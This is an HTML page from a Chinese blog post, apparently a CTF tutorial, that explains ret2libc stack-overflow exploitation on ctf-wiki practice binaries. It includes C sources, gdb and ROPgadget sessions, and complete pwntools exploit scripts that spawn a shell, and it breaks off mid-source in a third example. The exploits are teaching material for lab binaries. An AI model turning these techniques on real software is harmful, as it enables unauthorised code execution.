@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Ret2libc | sir</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="三生三世十里桃花 她就像是一道疤 像风像雨像飞沙  像空气一样难抓">
+<meta name="keywords" content="pwn-栈">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ret2libc">
+<meta property="og:url" content="https://cc-sir.github.io/2019/01/26/ret2libc/index.html">
+<meta property="og:site_name" content="sir">
+<meta property="og:description" content="三生三世十里桃花 她就像是一道疤 像风像雨像飞沙  像空气一样难抓">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-01-26T14:03:06.974Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Ret2libc">
+<meta name="twitter:description" content="三生三世十里桃花 她就像是一道疤 像风像雨像飞沙  像空气一样难抓">
+  
+    <link rel="alternative" href="/atom.xml" title="sir" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/touxiang.png" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">钞sir</a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1787684615@qq.com" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/cc-sir" title="github">github</a>
+                            
+                                <a class="fl QQ" target="_blank" href="tencent://QQInterLive/?Cmd=2&Uin=1787684615" title="QQ">QQ</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/pwn-堆/" style="font-size: 20px;">pwn-堆</a> <a href="/tags/pwn-栈/" style="font-size: 10px;">pwn-栈</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://ThunderJie.github.io/">ThunderJie</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://optimic.github.io/">观樂。</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">我已无力接住你，再也不能抗风雨</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">钞sir</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/touxiang.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">钞sir</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1787684615@qq.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/cc-sir" title="github">github</a>
+                    
+                        <a class="QQ" target="_blank" href="tencent://QQInterLive/?Cmd=2&Uin=1787684615" title="QQ">QQ</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-ret2libc" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/01/26/ret2libc/" class="article-date">
+      <time datetime="2019-01-26T14:05:51.904Z" itemprop="datePublished">2019-01-26</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Ret2libc
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn-栈/">pwn-栈</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>三生三世十里桃花 她就像是一道疤<br> 像风像雨像飞沙  像空气一样难抓<br><a id="more"></a></p>
+<hr>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ret2libc就是控制函数的执行libc中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，因此我们通常需要找到 system 函数的地址<br>ret2libc通常可以分为下面这几类：</p>
+<ul>
+<li>程序中自身就含有system函数和”/bin/sh”字符串</li>
+<li>程序中自身就有system函数，但是没有”/bin/sh”字符串</li>
+<li>程序中自身就没有system函数和”/bin/sh”字符串，但给出了libc.so文件</li>
+<li>程序中自身就没有system函数和”/bin/sh”字符串，并且没有给出libc.so文件</li>
+</ul>
+<hr>
+<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><p>不管程序没有直接给出我们需要条件，我们都要想办法找到system()函数的地址和”/bin/sh”字符串的地址；当程序中没有”/bin/sh”字符串时，我们可以利用程序中某些函数如:read,fgets,gets等函数将”/bin/sh”字符串写入bss段或某个变量中，并且要可以找到其地址；对于只给出了libc.so文件的程序，我们可以直接在libc.so文件当中去找system()函数和”/bin/sh”字符串，因为libc.so文件中也是包含这些了的；最后对于没有给出libc.so文件的程序，我们可以通过泄露出程序当中的某个函数的地址，通过查询来找出其使用lib.so版本是哪一个<br>我们以ctf-wiki中<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc" target="_blank" rel="noopener">例子</a>来看看具体方法</p>
+<hr>
+<h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><p>ret2libc1的源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *shell = <span class="string">"/bin/sh"</span>;</span><br><span class="line"><span class="keyword">char</span> buf2[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> secretcode, input;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    secretcode = rand();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line">    <span class="keyword">if</span>(input == secretcode)</span><br><span class="line">        system(<span class="string">"shell!?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"RET2LIBC &gt;_&lt;\n"</span>);</span><br><span class="line">    gets(buf1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>很明显查询当中有system()函数和”/bin/sh”字符串，并且有一个溢出漏洞<br>我们先看看它的保护开了哪些：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@sir-PC:/ret2libc1<span class="comment"># checksec ret2libc1</span></span><br><span class="line">[*] <span class="string">'/ret2libc1'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
+<p>没有开Stack和PIE，所以思路非常清晰了，只需要用system()函数的plt覆盖返回地址，并且将字符串传进去就可以了<br>找system()函数的plt位置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@sir-PC:/ret2libc1<span class="comment"># objdump -dj .plt ret2libc1</span></span><br><span class="line">...</span><br><span class="line">08048450 &lt;puts@plt&gt;:</span><br><span class="line"> 8048450:	ff 25 14 a0 04 08    	jmp    *0x804a014</span><br><span class="line"> 8048456:	68 10 00 00 00       	push   <span class="variable">$0x10</span></span><br><span class="line"> 804845b:	e9 c0 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048460 &lt;system@plt&gt;:</span><br><span class="line"> 8048460:	ff 25 18 a0 04 08    	jmp    *0x804a018</span><br><span class="line"> 8048466:	68 18 00 00 00       	push   <span class="variable">$0x18</span></span><br><span class="line"> 804846b:	e9 b0 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>找字符串的位置和多少字节溢出：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@sir-PC:/ret2libc1<span class="comment"># gdb ret2libc1</span></span><br><span class="line">pwndbg: loaded 174 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from ret2libc1...done.</span><br><span class="line">pwndbg&gt; b main</span><br><span class="line">Breakpoint 1 at 0x8048621: file ret2libc1.c, line 21.</span><br><span class="line">pwndbg&gt; cyclic 120</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">pwndbg&gt; search <span class="string">"/bin/sh"</span></span><br><span class="line">ret2libc1       0x8048720 0x6e69622f /* <span class="string">'/bin/sh'</span> */</span><br><span class="line">ret2libc1       0x8049720 <span class="string">'/bin/sh'</span> //字符串地址</span><br><span class="line">libc-2.27.so    0xf7f53988 das     /* <span class="string">'/bin/sh'</span> */</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x62616164 <span class="keyword">in</span> ?? ()</span><br><span class="line">pwndbg&gt; cyclic -l 0x62616164</span><br><span class="line">112 //溢出数</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./ret2libc1'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">system_addr = <span class="number">0x08048460</span></span><br><span class="line">binsh_addr = <span class="number">0x8049720</span></span><br><span class="line">p.recvuntil(<span class="string">'RET2LIBC &gt;_&lt;\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">112</span> + p32(system_addr) + <span class="string">'aaaa'</span> + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><p>ret2libc2的源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf2[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> secretcode, input;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    secretcode = rand();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line">    <span class="keyword">if</span>(input == secretcode)</span><br><span class="line">        system(<span class="string">"no_shell_QQ"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Something surprise here, but I don't think it will work.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"What do you think ?"</span>);</span><br><span class="line">    gets(buf1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>明显看到了system()函数，但是没有看到”/bin/sh”字符串，而且有溢出<br>看看保护机制：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@sir-PC:/ret2libc2<span class="comment"># checksec ret2libc2</span></span><br><span class="line">[*] <span class="string">'/ret2libc2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
+<p>所以现在思路也非常清晰，我们通过gest()函数向bss段或者直接是buf2中写入”/bin/sh/“,然后再将其作为参数传给system()函数，其中这里要用到ROP的技术，即我们payload为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="string">'a'</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="string">'aaaa'</span>, buf2])</span><br></pre></td></tr></table></figure></p>
+<p>找溢出数和buf2的地址:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@sir-PC:/ret2libc2<span class="comment"># gdb ret2libc2</span></span><br><span class="line">pwndbg: loaded 174 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from ret2libc2...done.</span><br><span class="line">pwndbg&gt; b main</span><br><span class="line">Breakpoint 1 at 0x8048651: file ret2libc.c, line 20.</span><br><span class="line">pwndbg&gt; cyclic 120</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">pwndbg&gt; p &amp;buf2</span><br><span class="line"><span class="variable">$2</span> = (char (*)[100]) 0x804a080 &lt;buf2&gt;</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">Something surprise here, but I don<span class="string">'t think it will work.</span></span><br><span class="line"><span class="string">What do you think ?aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab</span></span><br><span class="line"><span class="string">Program received signal SIGSEGV, Segmentation fault.</span></span><br><span class="line"><span class="string">0x62616164 in ?? ()</span></span><br><span class="line"><span class="string">pwndbg&gt; cyclic -l 0x62616164</span></span><br><span class="line"><span class="string">112</span></span><br></pre></td></tr></table></figure></p>
+<p>找gets()和system()函数的plt:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@sir-PC:/ret2libc2<span class="comment"># objdump -dj .plt ret2libc2</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">08048460 &lt;gets@plt&gt;:</span><br><span class="line"> 8048460:	ff 25 10 a0 04 08    	jmp    *0x804a010</span><br><span class="line"> 8048466:	68 08 00 00 00       	push   <span class="variable">$0x8</span></span><br><span class="line"> 804846b:	e9 d0 ff ff ff       	jmp    8048440 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">08048480 &lt;puts@plt&gt;:</span><br><span class="line"> 8048480:	ff 25 18 a0 04 08    	jmp    *0x804a018</span><br><span class="line"> 8048486:	68 18 00 00 00       	push   <span class="variable">$0x18</span></span><br><span class="line"> 804848b:	e9 b0 ff ff ff       	jmp    8048440 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048490 &lt;system@plt&gt;:</span><br><span class="line"> 8048490:	ff 25 1c a0 04 08    	jmp    *0x804a01c</span><br><span class="line"> 8048496:	68 20 00 00 00       	push   <span class="variable">$0x20</span></span><br><span class="line"> 804849b:	e9 a0 ff ff ff       	jmp    8048440 &lt;.plt&gt;</span><br></pre></td></tr></table></figure></p>
+<p>找合适的ROP:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@sir-PC:/ret2libc2<span class="comment"># ROPgadget --binary ret2libc2 --only "pop|ret"</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804872f : pop ebp ; ret</span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret //这个就合适，因为我们只有一个数据需要pop掉</span><br><span class="line">0x0804872e : pop edi ; pop ebp ; ret</span><br><span class="line">0x0804872d : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048426 : ret</span><br><span class="line">0x0804857e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">gets_addr = <span class="number">0x8048460</span></span><br><span class="line">system_addr = <span class="number">0x8048490</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x0804843d</span></span><br><span class="line">p.recvuntil(<span class="string">'What do you think ?'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">112</span> + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + <span class="string">'aaaa'</span> + p32(buf2_addr))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>或<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">proc = <span class="string">'./ret2libc2'</span></span><br><span class="line">p = process(proc)</span><br><span class="line">elf = ELF(proc)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">rop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">p.sendlineafter(<span class="string">'?'</span>,<span class="string">'a'</span>*<span class="number">112</span> + p32(elf.plt[<span class="string">'gets'</span>]) + p32(rop.search(<span class="number">8</span>).address) + p32(elf.bss()+<span class="number">0x100</span>) + p32(elf.plt[<span class="string">'system'</span>]) + <span class="string">'aaaa'</span> + p32(elf.bss()+<span class="number">0x100</span>))</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>这两个exp其实都一样的，不过一个向buf2中写数据，一个在bss段写</p>
+<hr>
+<h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><p>ret2libc3的源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf2[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span 